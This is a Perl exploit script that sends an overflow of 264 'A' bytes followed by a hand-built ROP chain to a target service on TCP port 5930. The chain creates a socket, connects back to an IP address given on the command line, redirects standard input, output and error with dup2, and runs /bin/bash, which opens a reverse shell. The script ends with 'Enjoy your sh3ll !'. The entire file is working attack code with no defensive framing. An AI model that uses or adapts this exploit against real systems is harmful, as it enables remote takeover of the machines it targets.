#!/usr/bin/perl                                                                                                                                                                    

use strict;
use warnings;

use IO::Socket::INET;


my $payload;
my $bss = 0x080edf90;
my $ip;
my $fd;
my $sock;

die "[-] Usage : $0   \n" if(@ARGV != 3);

$sock = IO::Socket::INET->new(
     PeerAddr => $ARGV[0],
     PeerPort => 5930,
     Proto    => 'tcp');

die "[-] Unable to connect : $!\n" if(!$sock);

$fd = $ARGV[2];
$ip = unpack('L', pack('CCCC', split(/\./, $ARGV[1])));

$payload .= "A"x264;

# socket struct                                                                                                                                                                    
$payload .= pack 'L', 0x080c1f06; # pop eax; ret                                                                                                                                   
$payload .= pack 'L', $bss;
$payload .= pack 'L', 0x080594aa; # pop edx                                                                                                                                        
$payload .= pack 'L', 0x00000002; # AF_INET                                                                                                                                        
$payload .= pack 'L', 0x0805ad01; # mov [eax], edx; ret                                                                                                                            

# socket struct                                                                                                                                                                    
$payload .= pack 'L', 0x080c1f06; # pop eax; ret                                                                                                                                   
$payload .= pack 'L', $bss+4;
$payload .= pack 'L', 0x080594aa; # pop edx                                                                                                                                        
$payload .= pack 'L', 0x00000001; # SOCK_STREAM                                                                                                                                    
$payload .= pack 'L', 0x0805ad01; # mov [eax], edx; ret                                                                                                                            

# socket struct                                                                                                                                                                    
$payload .= pack 'L', 0x080c1f06; # pop eax; ret                                                                                                                                   
$payload .= pack 'L', $bss+8; # exit                                                                                                                                               
$payload .= pack 'L', 0x080594aa; # pop edx                                                                                                                                        
$payload .= pack 'L', 0x00000006; # IPPROTO_TCP                                                                                                                                    
$payload .= pack 'L', 0x0805ad01; # mov [eax], edx; ret                                                                                                                            

# socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)                                                                                                                                        
$payload .= pack 'L', 0x080c1f06; # pop eax; ret                                                                                                                                   
$payload .= pack 'L', 102;        # SOCKETCALL                                                                                                                                     
$payload .= pack 'L', 0x080594d1; # pop ecx; pop ebx; ret                                                                                                                          
$payload .= pack 'L', $bss;       # sockaddr_in                                                                                                                                    
$payload .= pack 'L', 1;          # SYS_SOCKET                                                                                                                                     
$payload .= pack 'L', 0x08059ca0; # int 0x80

# connect struct                                                                                                                                                                   
$payload .= pack 'L', 0x080c1f06; # pop eax; ret                                                                                                                                   
$payload .= pack 'L', $bss;
$payload .= pack 'L', 0x080594aa; # pop edx                                                                                                                                        
$payload .= pack 'L', $fd;        # sock                                                                                                                                           
$payload .= pack 'L', 0x0805ad01; # mov [eax], edx; ret                                                                                                                            

# connect struct                                                                                                                                                                   
$payload .= pack 'L', 0x080c1f06; # pop eax; ret                                                                                                                                   
$payload .= pack 'L', $bss+4;
$payload .= pack 'L', 0x080594aa; # pop edx                                                                                                                                        
$payload .= pack 'L', $bss+12;    # sockaddr                                                                                                                                       
$payload .= pack 'L', 0x0805ad01; # mov [eax], edx; ret                                                                                                                            

# connect struct                                                                                                                                                                   
$payload .= pack 'L', 0x080c1f06; # pop eax; ret                                                                                                                                   
$payload .= pack 'L', $bss+8;
$payload .= pack 'L', 0x080594aa; # pop edx                                                                                                                                        
$payload .= pack 'L', 16;         # sizeof(sockaddr)                                                                                                                               
$payload .= pack 'L', 0x0805ad01; # mov [eax], edx; ret                                                                                                                            

# Jump the "bad" bytes                                                                                                                                                             
$payload .= pack 'L', 0x080594a8; #pop esi ; pop ebx ; pop edx ; ret ;                                                                                                             

# Add padding                                                                                                                                                                      
$payload .= "AAAAA";

# It's the entry point of the ROP chain, strange right ?!                                                                                                                          
$payload .= pack 'L', 0x080481cb; # ret                                                                                                                                            

# Alignment                                                                                                                                                                        
$payload .= "CCC";

# connect struct                                                                                                                                                                   
$payload .= pack 'L', 0x080c1f06; # pop eax; ret                                                                                                                                   
$payload .= pack 'L', $bss+12;
$payload .= pack 'L', 0x080594aa; # pop edx                                                                                                                                        
$payload .= pack 'L', 0x00100002; # AF_INET + PORT                                                                                                                                 
$payload .= pack 'L', 0x0805ad01; # mov [eax], edx; ret                                                                                                                            

# connect struct                                                                                                                                                                   
$payload .= pack 'L', 0x080c1f06; # pop eax; ret                                                                                                                                   
$payload .= pack 'L', $bss+16;
$payload .= pack 'L', 0x080594aa; # pop edx                                                                                                                                        
$payload .= pack 'L', $ip;        # IP                                                                                                                                             

$payload .= pack 'L', 0x0805ad01; # mov [eax], edx; ret                                                                                                                            

# connect()                                                                                                                                                                        
$payload .= pack 'L', 0x080c1f06; # pop eax; ret                                                                                                                                   
$payload .= pack 'L', 102;        # SOCKETCALL                                                                                                                                     
$payload .= pack 'L', 0x080594d1; # pop ecx; pop ebx; ret                                                                                                                          
$payload .= pack 'L', $bss;       # sockaddr                                                                                                                                       
$payload .= pack 'L', 3;          # SYS_CONNECT                                                                                                                                    
$payload .= pack 'L', 0x08059ca0; # int 0x80                                                                                                                                       

# copy "/bin"                                                                                                                                                                      
$payload .= pack 'L', 0x080c1f06; # pop eax; ret                                                                                                                                   
$payload .= pack 'L', $bss;
$payload .= pack 'L', 0x080594aa; # pop edx                                                                                                                                        
$payload .= "/bin";
$payload .= pack 'L', 0x0805ad01; # mov [eax], edx; ret                                                                                                                            

# copy "/bas"                                                                                                                                                                      
$payload .= pack 'L', 0x080c1f06; # pop eax; ret                                                                                                                                   
$payload .= pack 'L', $bss+4;
$payload .= pack 'L', 0x080594aa; # pop edx                                                                                                                                        
$payload .= "/bas";
$payload .= pack 'L', 0x0805ad01; # mov [eax], edx; ret

# copy "h\x00"                                                                                                                                                                     
$payload .= pack 'L', 0x080c1f06; # pop eax; ret                                                                                                                                   
$payload .= pack 'L', $bss+8;
$payload .= pack 'L', 0x080594aa; # pop edx                                                                                                                                        
$payload .= "h\x00\x00\x00";
$payload .= pack 'L', 0x0805ad01; # mov [eax], edx; ret                                                                                                                            

# ARGV[]                                                                                                                                                                           
$payload .= pack 'L', 0x080c1f06; # pop eax; ret                                                                                                                                   
$payload .= pack 'L', $bss+12;
$payload .= pack 'L', 0x080594aa; # pop edx                                                                                                                                        
$payload .= pack 'L', $bss;
$payload .= pack 'L', 0x0805ad01; # mov [eax], edx; ret                                                                                                                            

$payload .= pack 'L', 0x080c1f06; # pop eax; ret                                                                                                                                   
$payload .= pack 'L', $bss+16;
$payload .= pack 'L', 0x080594aa; # pop edx                                                                                                                                        
$payload .= pack 'L', 0;
$payload .= pack 'L', 0x0805ad01; # mov [eax], edx; ret                                                                                                                            

# dup2(0,3)                                                                                                                                                                        
$payload .= pack 'L', 0x080c1f06; # pop eax; ret                                                                                                                                   
$payload .= pack 'L', 63;
$payload .= pack 'L', 0x080594d1; # pop ecx; pop ebx; ret                                                                                                                          
$payload .= pack 'L', 0;
$payload .= pack 'L', $fd;
$payload .= pack 'L', 0x08059ca0; # int 0x80                                                                                                                                       

# dup2(1,3)                                                                                                                                                                        
$payload .= pack 'L', 0x080c1f06; # pop eax; ret                                                                                                                                   
$payload .= pack 'L', 63;
$payload .= pack 'L', 0x080594d1; # pop ecx; pop ebx; ret                                                                                                                          
$payload .= pack 'L', 1;
$payload .= pack 'L', $fd;
$payload .= pack 'L', 0x08059ca0; # int 0x80                                                                                                                                       

# dup2(2,3)                                                                                                                                                                        
$payload .= pack 'L', 0x080c1f06; # pop eax; ret                                                                                                                                   
$payload .= pack 'L', 63;
$payload .= pack 'L', 0x080594d1; # pop ecx; pop ebx; ret                                                                                                                          
$payload .= pack 'L', 2;
$payload .= pack 'L', $fd;
$payload .= pack 'L', 0x08059ca0; # int 0x80                                                                                                                                       

# execv                                                                                                                                                                            
$payload .= pack 'L', 0x080c1f06; # pop eax; ret                                                                                                                                   
$payload .= pack 'L', 11;         # SYS_EXECV                                                                                                                                      
$payload .= pack 'L', 0x080594d1; # pop ecx; pop ebx; ret                                                                                                                          
$payload .= pack 'L', $bss+12;    # ARGV[]                                                                                                                                         
$payload .= pack 'L', $bss;       # progname                                                                                                                                       
$payload .= pack 'L', 0x080594aa; # pop edx ret                                                                                                                                    
$payload .= pack 'L', $bss+16;    # ENV[]                                                                                                                                          
$payload .= pack 'L', 0x08059ca0; # int 0x80                                                                                                                                       

print $sock $payload;

print "[+] Enjoy your sh3ll !\n";
